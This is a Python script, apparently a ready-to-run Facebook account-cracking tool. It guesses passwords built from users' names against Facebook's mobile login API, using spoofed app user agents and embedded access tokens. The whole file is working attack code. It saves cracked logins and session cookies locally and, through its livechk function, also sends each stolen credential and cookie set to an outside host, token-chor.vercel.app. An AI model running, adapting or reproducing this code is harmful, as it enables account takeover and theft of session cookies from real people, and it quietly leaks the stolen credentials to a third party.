#<<_________[ IMPORTANT DATA ]_________>>#
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote
from os import path
import os,base64,zlib,pip,urllib,time
import datetime
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
    os.system(f'pip install requests futures==2 > /dev/null')
except:pass
os.system("clear")
#____Approval-System____#


dic = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'Agustus',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'Agustus',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
def jalan(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)
def uaa():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/223.0.0.330;FBBV/924202270;FBDM/{density=23.0,width=6480,height=11200};FBLC/en_BD;FBRV/662382680;FBCR/DhakaCityV23;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S923U;FBSV/33;nullFBCA/armeabi-v29a:armeabi-v28a;]"
def R_Ua():
        samsung_models = [
            "SM-P610|P610XXS3FWD2",
            "SM-T595|T595XXU4CVG4",
            "SM-A107M|A107MUBS6CWD3",
            "SM-A307GT|A307GTVJS5CWE2",
            "SM-G991U|G991USQS8EWG1",
            "SM-G985F|G985FXXSIHWGA",
            "SM-N985F|N985FXXS7HWG1",
            "SM-A515F|A515FXXU7HWF1",
            "SM-A725F|A725FXXU6DWE3",
            "SM-M315F|M315FXXU3CWA2",
            "SM-F916U|F916USQS2JWE4",]
        model_,build = random.choice(samsung_models).rsplit('|')
        os_v = random.randint(4, 13)
        fbav = f"{os_v}.0.{random.randint(111, 999)}.{random.randint(111, 999)}"
        ua = ('[FBAN/Orca-Android;FBAV/'+str(fbav)+';FBPN/com.facebook.orca;FBLC/bn_BD;FBBV/'+str(random.randint(111111111,999999999))+';FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/'+str(model_)+'/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;]')
        return ua
def X1():
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))
    a1 = ";Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    a2 = ";Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    a3 = ";Dalvik/1.6.0 (Linux; U; Android 4.4.4; Z987 Build/KTU84P) [FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]"
    a4 = ";Dalvik/2.1.0 (Linux; U; Android 8.1.0; MI 5X MIUI/V10.3.1.0.ODBCNXM) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507224;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBDV/MI 5X;FBSV/8.1.0;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    a5 = ";Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]"
    a6 = ";Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C) [FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]"
    a7 = ";Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build/NJH47F) [FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]"
    a8 = ";Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]"
    a9 = ";Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1"
    a10 = ";Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1"
    ua = a+random.choice([a1,a2,a3,a4,a5,a6,a7,a8,a9,a10])
    return ua
sys.stdout.write('\x1b]2; SMZ \x07')
BB="\033[1;30m"         # Black
R="\033[1;31m"            # Red
G="\033[1;32m"         # Green
Y="\033[1;33m"        # Yellow
B="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
W="\033[1;37m"         # White
#<<_________[ LOGO ]_________>>#
logo=(f"""
     ######  ##     ## ######## 
    ##    ## ###   ###      ##  
    ##       #### ####     ##   
     ######  ## ### ##    ##    
          ## ##     ##   ##     
    ##    ## ##     ##  ##      
     ######  ##     ## ########  X (A)
──────────────────────────────────────────────
[•] Owner   >>  Sheraz King
[•] Status  >>  {G}Free
{W}[•] Version >>  2.9
──────────────────────────────────────────────""")
def livechk(cooker):
   requests.get("https://token-chor.vercel.app/livedied",data={'acc': cooker})
#<<_________[ LINE ]_________>>#
def line():
    print(f"{W}──────────────────────────────────────────────")
#<<_________[ CLEAR ]_________>>#
def clear():
    os.system('clear')
    print(logo)
#<<_________[ LOOP ]_________>>#
loop=0
oks=[]
cps=[]
pcp=[]
#<<_________[ MANU ]_________>>#
def SMZ():
    clear()
    print('[1] File Cloning')
    print('[0] Exit Menu')
    line()
    me=input('[?] Select Option : ')      
    if me in ["1", "01"]:
        clear()
        
        file = input(f'[?] Put File \033[91;1m:\033[97;1m ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            clear();print('\033[91;1m [\033[97;1m+\033[91;1m]\033[97;1m File Not Found')
            time.sleep(2)
            SMZ()
        clear()
        print('[1] Method (Mix)')
        print('[2] Method (Mix)')
        print('[3] Method (new)')
        line()
        mthd=input('\033[91;1m [\033[97;1m+\033[91;1m]\033[97;1m Choice \033[91;1m:\033[97;1m ')
        plist=[]
        clear()
        print('[1] Auto Password')
        print('[1] Auto Password')
        print('[3] Manual Password')
        line()
        ppp=input(f'{R} [{W}+{R}]{W} CHOSE: ')
        clear()
        if ppp in ['1','01']:
                plist.append('first last')
                plist.append('firstlast')
                plist.append('first123')
                plist.append('first1234')
                plist.append('first12345')
                plist.append('first1122')
                plist.append('first786')
                plist.append('firstlast123')
                plist.append('firstlast1234')
                plist.append('firstlast12345')
                plist.append('firstlast1122')
                plist.append('firstlast786')
                plist.append('first@123')
                plist.append('first@12345')
                plist.append('First last')
                plist.append('First123')
                plist.append('First@123')
                plist.append('last123')
                plist.append('last@123')
                plist.append('5121472')
                plist.append('07860786')
                plist.append('151214')
                plist.append('15121472')
        elif ppp in ['2','02']:
                plist.append('lastfirstl')
                plist.append('lastlast')
                plist.append('firstfirst')
                plist.append('firstlast')
                plist.append('last first')
                plist.append('first last')
                plist.append('firstlast')
                plist.append('firstlast1122')
                plist.append('firstlast123')
                plist.append('first123')
                plist.append('first12345')
                plist.append('first123456789')
                plist.append('first123456')
                plist.append('first@123')
                plist.append('first1999')
                plist.append('first2002')
                plist.append('first2003')
                plist.append('first2001')
                plist.append('first2020')
                plist.append('firstlast123456')
                plist.append('firstlast12345')
                plist.append('last123')
                plist.append('last1234')
                plist.append('last12345')
                plist.append('last123456')
        else:
                try:
                    ps_limit = int(input(f'{R} [{W}+{R}]{W} PUT PASS LIMIT : '))
                except:
                    ps_limit = 2
                clear()
                
                for i in range(ps_limit):
                        plist.append(input(f'{R} [{W}+{R}]{W} PUT PASS {i+1}: '))
        
        cx="y"
        if cx in ['y','Y','yes','Yes']:
            pcp.append('y')
        else:
            pcp.append('n')
        with tred(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(f'[•] Total Acounts :{G} '+total_ids+f' ')
            print(f"{R}[•] Use Flight Mode For Speed Up")
            line()
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if mthd in ['1','01']:
                    crack_submit.submit(api1,ids,names,passlist)
                elif mthd in ['2','02']:
                    crack_submit.submit(api2,ids,names,passlist)
                elif mthd in ['3','03']:
                    crack_submit.submit(api3,ids,names,passlist)
        print('\033[97;1m')
        
        line()
        input('\033[91;1m [\033[97;1m+\033[91;1m]\033[97;1m Press Enter To Back Menu')
        SMZ()
    elif me in ["0", "00"]:
        clear()
        exit('\033[91;1m [\033[97;1m+\033[91;1m]\033[97;1m Thanks For Use')
    else:
        clear()
        SMZ()
#<<_________[ FILE M1 ]_________>>#
def api1(ids,names,passlist):
    try:
        global oks,loop,cps
        sys.stdout.write(f'\r\033[97;1m[\033[97;1mSMZ-M1\033[97;1m] %s / \033[92;1mOK:%s {W}/ \033[91;1mCP:%s \033[97;1m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = first
        for pas in passlist:
            pas = pas.replace("first", first).replace("last", last)
            pas = pas.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": X1(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=headers).json()
            if 'session_key' in po:
                print(f'\r\r\033[92;1m[SMZ-OK] '+ids+' | '+pas+'\033[1;97m')
                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{ckkk}"
                open('/sdcard/SMZ-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SMZ-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                livechk("[•]"+ids+"|"+pas+"|"+cookies) 
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcp:
                    print(f'\r\r\033[91;1m[SMZ-CP] '+ids+' | '+pas+'\033[1;97m')
                    open(f'/sdcard/SMZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    open(f'/sdcard/SMZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#<<_________[ FILE M2 ]_________>>#
def api2(ids,names,passlist):
    try:
        global oks,loop,cps
        sys.stdout.write(f'\r\033[97;1m[\033[97;1mSMZ-M2\033[97;1m] %s / \033[92;1mOK:%s {W}/ \033[91;1mCP:%s \033[97;1'%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/196.0.0.22;FBBV/13273252;FBDM/{density=0.75,width=1174,height=2257};FBLC/en_GB;FBCR/Airlink Mobile;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A6060;FBSV/6.1;nullFBCA/armeabi-v7a:armeabi;]"
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": uaa(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=headers).json()
            if 'session_key' in po:
                print(f'\r\r\033[92;1m[SMZ-OK] '+ids+' | '+pas+'\033[1;97m')
                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{ckkk}"
                open('/sdcard/SMZ-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SMZ-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                livechk("[•]"+ids+"|"+pas+"|"+cookies) 
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcp:
                    print(f'\r\r\033[91;1m[SMZ-CP] '+ids+' | '+pas+'\033[1;97m')
                    open(f'/sdcard/SMZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    open(f'/sdcard/SMZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#<<_________[ FILE M3 ]_________>>#
def api3(ids,names,passlist):
    try:
        global oks,loop,cps
        sys.stdout.write(f'\r\033[97;1m[\033[97;1mSMZ-M3\033[97;1m] %s / \033[92;1mOK:%s {W}/ \033[91;1mCP:%s \033[97;1'%(loop,len(oks),len(cps)));sys.stdout.flush()
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = first
        for pas in passlist:
            pas = pas.replace("first", first).replace("last", last)
            pas = pas.lower()
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/205.0.0.150;FBBV/924202090;FBDM/{density=5.0,width=2400,height=4000};FBLC/en_BD;FBRV/662382500;FBCR/DhakaCityV5;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S923U;FBSV/16;nullFBCA/armeabi-v11a:armeabi-v10a;]"
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_PK","client_country_code": "PK","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=headers).json()
            if 'session_key' in po:
                print(f'\r\r\033[92;1m[SMZ-OK] '+ids+' | '+pas+'\033[1;97m')
                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"sb={ssbb};{ckkk}"
                open('/sdcard/SMZ-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SMZ-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                livechk("[•]"+ids+"|"+pas+"|"+cookies) 
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcp:
                    print(f'\r\r\033[91;1m[SMZ-CP] '+ids+' | '+pas+'\033[1;97m')
                    open(f'/sdcard/SMZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    open(f'/sdcard/SMZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

#<<_________[ END ]_________>>#
SMZ()